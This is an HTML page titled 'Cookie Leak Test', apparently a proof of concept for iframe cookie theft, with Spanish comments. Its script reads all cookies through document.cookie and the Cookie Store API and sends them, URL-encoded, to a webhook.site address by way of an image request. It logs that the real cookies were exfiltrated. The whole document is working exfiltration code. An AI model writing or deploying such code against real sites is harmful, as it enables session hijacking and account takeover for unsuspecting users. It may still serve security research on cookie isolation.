<!DOCTYPE html>
<html>
<body>
    <h2>Cookie Leak Test</h2>
    <pre id="log" style="background:#000; color:#0f0; padding:10px;"></pre>

    <script>
        const logEl = document.getElementById('log');
        const webhookUrl = "https://webhook.site/118f2af5-6014-4c45-ab14-1543fc773f54";

        function log(msg) {
            logEl.textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
        }

        log("Origen actual: " + window.location.origin);
        log("¿Es Top Frame? " + (window.self === window.top));

        // 1. Leemos TODAS las cookies actuales del iframe
        const cookies = document.cookie;
        log("Cookies actuales del iframe: " + (cookies || "(vacío)"));
        
        // 2. Si hay cookies, intentamos leerlas con la Cookie Store API
        if (window.cookieStore) {
            window.cookieStore.getAll().then((cookiesArray) => {
                log("Cookie Store API: " + JSON.stringify(cookiesArray));
                
                // Si hay cookies, las exfiltramos
                if (cookiesArray.length > 0) {
                    const img = new Image();
                    img.src = `${webhookUrl}?real_cookies=true&data=${encodeURIComponent(JSON.stringify(cookiesArray))}`;
                    log("📤 ¡Cookies reales exfiltradas al webhook!");
                } else {
                    log("No hay cookies reales en el iframe.");
                }
            }).catch((e) => {
                log("Error en Cookie Store API: " + e.message);
            });
        } else {
            log("Cookie Store API no disponible.");
        }
    </script>
</body>
</html>
